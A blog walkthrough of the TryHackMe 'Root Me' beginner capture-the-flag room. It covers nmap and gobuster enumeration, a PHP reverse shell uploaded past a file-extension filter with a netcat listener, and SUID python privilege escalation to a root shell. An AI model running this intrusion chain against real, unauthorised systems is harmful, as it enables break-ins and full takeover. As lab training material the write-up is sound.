---
title: TryHackMe Root Me
date: 2024-03-09 00:00:00 +0800
categories: [TryHackMe, Challenge]
tags: [walkthough,write-ups]     # TAG names should always be lowercase
image:
    path: https://tryhackme-images.s3.amazonaws.com/room-icons/11d59cb34397e986062eb515f4d32421.png
---
A ctf for beginners, can you root me? You need to be able to use scanning tools like nmap or gobuster. Know basic network service exploitation and linux privilege escalation.

## **Reconnaissance**

```bash
nmap -Pn -n -sV -sC -p- <TARGET_IP> --open
```
`-Pn`: Treats all hosts as online, skipping host discovery. This is useful if the target firewall is blocking ICMP ping requests.

`-n`: Disables DNS resolution, preventing nmap from attempting to resolve hostnames.

`-sV`: Enables version detection, which attempts to determine the version of services running on open ports.

`-sC`: Enables default script scanning, executing a set of scripts to discover additional information and potential vulnerabilities.

`-p-`: Scans all 65,535 TCP ports, allowing for thorough port enumeration.

`10.10.247.78`: Specifies the target IP address.

`--open`: Shows only open ports in the output, filtering out closed and filtered ports.


```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-13 02:08 EST
Nmap scan report for 10.10.247.78
Host is up (0.38s latency).
Not shown: 58692 closed tcp ports (conn-refused), 6841 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.66 seconds
```
Based on the Nmap scan results, the target system has two open ports with the following services.
- Port 22/tcp: OpenSSH 7.6p1 running on Ubuntu Linux.
- Port 80/tcp: Apache HTTP Server 2.4.29 running on Ubuntu.

## **Insights**
---
- 80 HTTP
    - Web server is running, we can try accessing that.
	- There is a public facing website with an Apache HTTP Server with a `version 2.4.29` running on `Ubuntu`
	- Using `gobuster`, we have found an upload page.
- 22 SSH
    - We need some credentials to access this and bruteforcing can take a really long time before the credentials can be cracked. Hence, this is the least of our priorities for pentesting.

## **Enumeration**
---

### 80 HTTP

Before anything else, let us first check how the website looks like.

![Desktop View](/assets/images/rootme/rootme.png){: width="972" height="589" }

Inspecting the source code isn't helpful either.

Now let us scan what other directories this website can give using **`gobuster`**

```bash
gobuster dir -u <TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30
```
**`-w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt`**: Specifies the wordlist (dictionary) file to use for directory and file names. I am using Seclist. See here: <https://github.com/danielmiessler/SecLists>

`-k`: Disables SSL certificate validation, allowing connections to self-signed or invalid certificates.

**`-t 30`**: Sets the number of concurrent threads to 30, which means it will perform 30 requests simultaneously.

```text
/css                  (Status: 301) [Size: 310] [--> http://10.10.247.78/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.247.78/js/]
/uploads              (Status: 301) [Size: 314] [--> http://10.10.247.78/uploads/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.247.78/panel/]
/server-status        (Status: 403) [Size: 277]
```
Looks like we have some interesting directories here.

![Desktop View](/assets/images/rootme/uploads.png){: width="972" height="589" }

The `/uploads` can be significant as it might allow users to execute the uploaded file on the server.

![Desktop View](/assets/images/rootme/panel.png){: width="972" height="589" }

The `/panel` could be a crucial target for exploitation since we are allowed to have file uploads.

> We can see the `/uploads`  and `/panel`directory.
{: .prompt-tip }


## **Gaining an Initial Foothold**

Let us try uploading a file and possibly, execute an exploit for a file upload vulnerability. We can try uploading a PHP reverse shell to the `/panel` directory and see if we can catch some reverse shell.

Download the script here: <https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php>

![Desktop View](/assets/images/rootme/rev-shell.png){: width="972" height="589" }

Before uploading the php reverse shell, you need to edit the `$ip` and `$port` variable. The $ip **contains your IP address** while the $port contains the **listening port** that serves as the endpoint for the connection initiated by the compromised target machine. You can use your preferred text editor for editing the php file you've just downloaded.

![Desktop View](/assets/images/rootme/error-upload.png){: width="972" height="589" }

It looks like there is a file extension checks which prevent users from uploading potentially malicious files. Fortunately, we can bypass it by changing the `.php` extension.

See here: <https://book.hacktricks.xyz/pentesting-web/file-upload>

You can manually edit the PHP file extension using the above reference, or try an automated approach using a tool like `Burp Suite` to check whether the HTTP response indicates a successful upload or not.

Once the file have been successfully uploaded, setup a netcat listener to catch a reverse-shell when the file is executed on `/uploads` directory.

```bash
nc -lnvp <PORT_FROM_THE_FILE>
```

Upon executing, you should catch a reverse shell by now from the netcat listener we have established earlier.

![Desktop View](/assets/images/rootme/catch-rev-shell.png){: width="972" height="589" }

This is a dumb shell and we have to stabilise it to have a more beautiful and functional shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear -lsaht --color=auto'

Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```
![Desktop View](/assets/images/rootme/stable-shell.png){: width="972" height="589" }

Thanks to S1REN! <https://sirensecurity.io/blog/break-out-get-that-tty/>

We now have a prettier and more smarter shell, we can now be able to find the flag for the next question.

```python
find / -type f -name "user.txt"
```


## **Privilege Escalation**

Unfortunately, the other flag seems to be accessible only for the root user which means we need to escalate our privilege. 

I initially checked `sudo -l` command to list the permissions granted to the current user in the sudoers file. This command is particularly useful for determining what actions or commands a user can execute with elevated privileges using sudo. However, it seems like it is `password protected`.

Now we try using the **`SUIDS Permission.`**

```python
find / -perm -u=s -type f 2>/dev/null
```

The command searches the entire file system (starting from the root directory) for regular files with the setuid permission. Any errors encountered during the search are suppressed by redirecting them to **`/dev/null`. By suppressing errors, it ensures a cleaner output for the user.**

```text
/usr/bin/python
```

Now let us escalate or privilege using the code below. See more <https://gtfobins.github.io/gtfobins/python/#suid>

```python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
When `/usr/bin/python` has the SUID permission set, it runs with the privileges of the file owner (typically root). This means that any commands executed using python will inherit these elevated privileges.

The `-c` option in `python` allows for executing Python code from the command line. In this case, the Python code imports the `os` module and uses the `os.execl()` function to replace the current process with `/bin/sh`, effectively spawning a new shell.

The `/bin/sh` shell is being executed with the `-p`option, which makes it run in privileged mode. This means that the attacker gains access to a shell with root privileges, allowing them to perform any actions on the system as the root user.

> Do not forget to find the FINAL FLAG
{: .prompt-danger }
## FLAG

![Desktop View](/assets/images/rootme/pwned.png){: width="972" height="589" }

## TAKE AWAY CONCEPTS
- Check for SUID/GUID Permission
- Check for sudo permissions
- Try renaming the file extension for file upload vulnerability
- Try finding a vulnerability on the web application first before bruteforcing SSH.